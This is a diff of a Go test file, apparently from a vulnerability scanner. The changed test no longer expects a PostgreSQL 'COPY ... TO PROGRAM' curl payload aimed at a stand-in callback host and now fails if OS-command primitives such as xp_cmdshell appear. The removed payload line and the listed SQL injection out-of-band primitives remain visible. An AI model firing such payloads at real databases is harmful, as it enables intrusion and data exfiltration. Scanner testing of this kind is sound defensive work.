@@ -63,14 +63,14 @@ func TestSSRFOOBPayloadsBypasses(t *testing.T) {
 	}
 }
 
-func TestSQLiOOBIncludesPostgresCopyProgram(t *testing.T) {
+func TestSQLiOOBStaysWithinDatabaseProof(t *testing.T) {
 	cb := "http://oast.example.com/oob/rcnoob0123456789"
 	joined := strings.Join(sqliOOBPayloads(cb, "oast.example.com"), "\n")
-	if !strings.Contains(joined, "TO PROGRAM 'curl -s "+cb+"'") {
-		t.Fatalf("expected a PostgreSQL COPY ... TO PROGRAM OOB payload")
+	if strings.Contains(joined, "TO PROGRAM") || strings.Contains(joined, "xp_cmdshell") {
+		t.Fatalf("SQLi confirmation must not execute operating-system commands: %s", joined)
 	}
-	// existing Oracle/MSSQL primitives must still be there.
-	for _, want := range []string{"UTL_HTTP.REQUEST", "xp_cmdshell", "xp_dirtree", "LOAD_FILE"} {
+	// Oracle/MSSQL/MySQL DB-native primitives remain.
+	for _, want := range []string{"UTL_HTTP.REQUEST", "xp_dirtree", "LOAD_FILE"} {
 		if !strings.Contains(joined, want) {
 			t.Errorf("SQLi OOB set regressed, missing %q", want)
 		}
